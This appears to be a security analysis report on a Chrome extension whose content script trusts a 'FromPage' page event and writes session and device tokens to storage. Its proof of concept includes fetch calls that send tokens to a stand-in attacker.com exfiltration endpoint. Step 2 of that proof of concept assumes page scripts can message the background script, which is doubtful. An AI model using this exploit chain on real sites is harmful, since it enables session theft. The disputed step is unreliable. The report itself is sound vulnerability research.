# CoCo Analysis: jppofikkghkpohnmipjpchemefaaadbe

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (same vulnerability, different tokens)

---

## Sink 1: document_eventListener_FromPage → chrome_storage_local_set_sink (sessionToken)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jppofikkghkpohnmipjpchemefaaadbe/opgen_generated_files/cs_0.js
Line 708: document.addEventListener('FromPage', (event) => {
Line 712: value: event.detail.sessionToken
```

**Code:**

```javascript
// Content script (cs_0.js) - Lines 708-724
document.addEventListener('FromPage', (event) => {  // ← attacker can dispatch this event
  chrome.runtime.sendMessage({
    action: "saveLocalStorage",
    key: "sessionToken",
    value: event.detail.sessionToken  // ← attacker-controlled data
  }, (response) => {
    console.log('From Content Script, Background LocalStorage:', response.data);
  });

  chrome.runtime.sendMessage({
    action: "saveLocalStorage",
    key: "deviceToken",
    value: event.detail.deviceToken  // ← attacker-controlled data
  }, (response) => {
    console.log('From Content Script, Background LocalStorage:', response.data);
  });
});

// Background script (bg.js) - Lines 1400-1412: Storage write handler
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  switch (request.action) {
    case "saveLocalStorage":
      const { key, value } = request;
      console.log(`Attempting to save: ${key}: ${value}`);
      chrome.storage.local.set({ [key]: value }, () => {  // ← stores attacker data
        if (chrome.runtime.lastError) {
          console.error('Error saving to storage:', chrome.runtime.lastError);
          sendResponse("false");
        } else {
          console.log("Saved data to storage.");
          sendResponse("true");
        }
      });
      return true;

    // Lines 1389-1398: Storage read handler - retrieval path
    case "getLocalStorage":
      chrome.storage.local.get(request.key, (result) => {
        if (chrome.runtime.lastError) {
          console.error('Error getting item from storage:', chrome.runtime.lastError.message);
          sendResponse({ error: chrome.runtime.lastError.toString() });
        } else {
          sendResponse({ data: result[request.key] });  // ← sends back poisoned data
        }
      });
      return true;
  }
});
```

**Manifest configuration:**
```json
{
  "content_scripts": [
    {
      "matches": ["*://*/*"],  // Runs on ALL websites
      "js": ["content.js"],
      "run_at": "document_start"
    }
  ],
  "permissions": ["storage"]
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event dispatch from malicious webpage

**Attack:**

```javascript
// Step 1: Attacker poisons storage (from ANY website)
// The content script runs on all sites (*://*/*)
document.dispatchEvent(new CustomEvent('FromPage', {
  detail: {
    sessionToken: "malicious_session_token_12345",
    deviceToken: "malicious_device_token_67890"
  }
}));

// Step 2: Attacker retrieves poisoned data
// Since content script runs on attacker's page too, it can send messages to background
chrome.runtime.sendMessage({
  action: "getLocalStorage",
  key: "sessionToken"
}, (response) => {
  console.log("Retrieved sessionToken:", response.data);
  // Exfiltrate to attacker's server
  fetch("https://attacker.com/exfil", {
    method: "POST",
    body: JSON.stringify({
      sessionToken: response.data
    })
  });
});

chrome.runtime.sendMessage({
  action: "getLocalStorage",
  key: "deviceToken"
}, (response) => {
  console.log("Retrieved deviceToken:", response.data);
  // Exfiltrate to attacker's server
  fetch("https://attacker.com/exfil", {
    method: "POST",
    body: JSON.stringify({
      deviceToken: response.data
    })
  });
});
```

**Impact:** Complete storage exploitation chain - any malicious website can:
1. **Poison storage:** Inject malicious session and device tokens into the extension's storage by dispatching the `FromPage` custom DOM event with attacker-controlled data
2. **Retrieve poisoned data:** Use the content script (which runs on the attacker's site) to send messages to the background requesting stored data via `getLocalStorage` action
3. **Session hijacking:** The poisoned session/device tokens can be used to impersonate users or manipulate extension behavior
4. **Data exfiltration:** Retrieve legitimate tokens stored by the extension on other sites, enabling session theft and unauthorized access

The vulnerability exists because the content script runs on ALL websites (`*://*/*`) and blindly trusts DOM events dispatched by webpage JavaScript, creating a complete attack chain for storage poisoning and data exfiltration.

---

## Sink 2: document_eventListener_FromPage → chrome_storage_local_set_sink (deviceToken)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jppofikkghkpohnmipjpchemefaaadbe/opgen_generated_files/cs_0.js
Line 708: document.addEventListener('FromPage', (event) => {
Line 720: value: event.detail.deviceToken
```

**Classification:** TRUE POSITIVE

**Reason:** Same vulnerability as Sink 1, but for the `deviceToken` field. Both sessionToken and deviceToken flow through the same vulnerable code path, allowing complete storage exploitation.
